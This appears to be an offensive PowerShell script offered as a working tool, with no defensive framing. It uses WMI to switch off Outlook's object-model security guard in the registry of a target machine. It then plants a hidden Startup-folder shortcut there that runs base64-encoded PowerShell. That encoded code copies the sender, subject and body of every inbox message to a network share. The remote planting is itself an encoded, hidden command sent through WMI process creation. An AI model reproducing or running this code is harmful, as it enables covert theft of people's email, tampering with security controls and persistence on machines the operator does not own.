


function patchoutlookreg([string]$version,[bool]$is6432,[string]$tar){
    if(!$tar){
        $tar='.'
    }
    $keypath = "software\Microsoft\Office\$version.0\Outlook\Security"
    if($is6432){
        $keypath = $keypath -replace '\\Microsoft','\Wow6432Node\Microsoft'
    }

    $registry = [wmiclass]"\\$tar\root\default:stdregprov"
    $registry.CreateKey(2147483650,$keypath) | Out-Null
    $registry.SetDWORDValue(2147483650,$keypath,'ObjectModelGuard',2) | Out-Null
    "debug: patched $keypath objectmodelguard to 2"
}
function patchoutlook([string]$tar){

$bitness = (gwmi -q 'select osarchitecture from win32_operatingsystem' -co $tar).osarchitecture.substring(0,2)
$versions = gwmi win32reg_addremoveprograms -co $tar | ?{$_.displayname -match 'microsoft office'} | %{$_.version.substring(0,2)} | select -u
if($bitness -eq '64'){
$versions | %{patchoutlookreg -version $_ -is6432 1 -tar $tar}
}
$versions | %{patchoutlookreg -version $_ -is6432 0 -tar $tar}
}

#link code
#$savepath = "\\path\to\folder\i\think\i_$env:username-$env:computername";
#$outlook = New-Object -ComObject outlook.application;
#$ns = $outlook.GetNamespace("MAPI");
#$inbox = $ns.GetDefaultFolder([Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderInbox);
#$inbox.Items | %{$_ | select sendername,receivedbyname,subject,body,receivedtime,remindertime} | Export-Clixml $savepath

#link creation
function createstartuplink([string]$tar,[string]$targetfile){
$st = 'sleep 5;
$s = "\\path\to\folder\i\think\i_$env:username-$env:computername";
$o = New-Object -co outlook.application;
$n = $o.GetNamespace("MAPI");
$i = $n.GetDefaultFolder([Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderInbox);
$i.Items | %{$_ | select sendername,receivedbyname,subject,body,receivedtime,remindertime} | Export-Clixml $s'

$q = [convert]::ToBase64String([text.encoding]::Unicode.GetBytes($st))
$lnkpath = 'C:\users\public\coollink.lnk'
$wsh = New-Object -ComObject wscript.shell
$lnk = $wsh.CreateShortcut($lnkpath)
$lnk.TargetPath = 'C:\windows\system32\windowspowershell\v1.0\powershell.exe'
$lnk.IconLocation = 'C:\windows\system32\shell32.dll,71'

$lnk.Arguments = "-win hidden -enc $q"
$lnk.WindowStyle = 7
$lnk.save()
$kewl = [convert]::tobase64string([io.file]::readallbytes($lnkpath))
if(!$targetfile){
    $targetfile = "C:\programdata\microsoft\windows\Start Menu\Programs\Startup\xd.bat.lnk"
}
$rcmd = "[io.file]::WriteAllBytes('$targetfile',[convert]::FromBase64String('$kewl'))"
$lnk64 = [convert]::ToBase64String([text.encoding]::Unicode.GetBytes($rcmd))
Invoke-WmiMethod -Class Win32_Process -ComputerName $tar -Name Create -ArgumentList ("powershell -nop -win hidden -enc "+$lnk64)
Remove-Item $lnkpath -Force
}

patchoutlook localhost
createstartuplink localhost